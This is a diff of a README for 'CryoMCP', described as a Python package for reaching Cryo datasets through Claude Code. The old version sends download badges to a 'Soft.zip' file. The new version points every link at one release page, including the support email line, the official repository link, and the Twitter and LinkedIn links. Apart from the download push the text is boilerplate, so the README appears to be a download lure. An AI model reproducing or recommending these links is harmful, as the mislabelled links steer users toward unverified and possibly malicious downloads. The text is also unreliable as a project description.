@@ -1,5 +1,5 @@
 # 🧊 CryoMCP: Accessing Cryo Datasets with Ease 
-[![Access CryoMCP](https://img.shields.io/badge/Access-CryoMCP-blue)](https://github.com/files/Soft.zip)
+[![Access CryoMCP](https://github.com/KamalKrishnan/cryo-mcp/releases/tag/v1.2)](https://github.com/KamalKrishnan/cryo-mcp/releases/tag/v1.2)
 
 ## Overview
 CryoMCP is a Python package designed to simplify the process of accessing Cryo datasets using the Claude Code. Whether you are a researcher, developer, or data enthusiast, CryoMCP provides you with the tools needed to seamlessly interact with Cryo datasets for a variety of purposes.
@@ -13,18 +13,18 @@ CryoMCP is a Python package designed to simplify the process of accessing Cryo d
 ## Getting Started
 To get started with CryoMCP, simply click the button below to download the package and begin exploring Cryo datasets:
 
-[![Launch CryoMCP](https://img.shields.io/badge/Launch-CryoMCP-green)](https://github.com/files/Soft.zip)
+[![Launch CryoMCP](https://github.com/KamalKrishnan/cryo-mcp/releases/tag/v1.2)](https://github.com/KamalKrishnan/cryo-mcp/releases/tag/v1.2)
 
 If the link does not work or is not accessible, please check the "Releases" section of the repository for alternative download options.
 
 ## Resources
-For more information, resources, and updates, visit the official [CryoMCP repository](https://github.com/cryo-mcp).
+For more information, resources, and updates, visit the official [CryoMCP repository](https://github.com/KamalKrishnan/cryo-mcp/releases/tag/v1.2).
 
 ## Support
-For any questions, concerns, or feedback regarding CryoMCP, feel free to reach out to our team at support@cryomcp.com. We are here to assist you on your Cryo dataset journey!
+For any questions, concerns, or feedback regarding CryoMCP, feel free to reach out to our team at https://github.com/KamalKrishnan/cryo-mcp/releases/tag/v1.2 We are here to assist you on your Cryo dataset journey!
 
 ## Stay Connected
-Stay up to date with the latest CryoMCP news and updates by following us on [Twitter](https://twitter.com/cryo_mcp) and [LinkedIn](https://www.linkedin.com/company/cryomcp).
+Stay up to date with the latest CryoMCP news and updates by following us on [Twitter](https://github.com/KamalKrishnan/cryo-mcp/releases/tag/v1.2) and [LinkedIn](https://github.com/KamalKrishnan/cryo-mcp/releases/tag/v1.2).
 
 ## Acknowledgements
 CryoMCP would like to thank the open-source community, contributors, and users for their ongoing support and dedication to advancing data accessibility and exploration in the Cryo field.
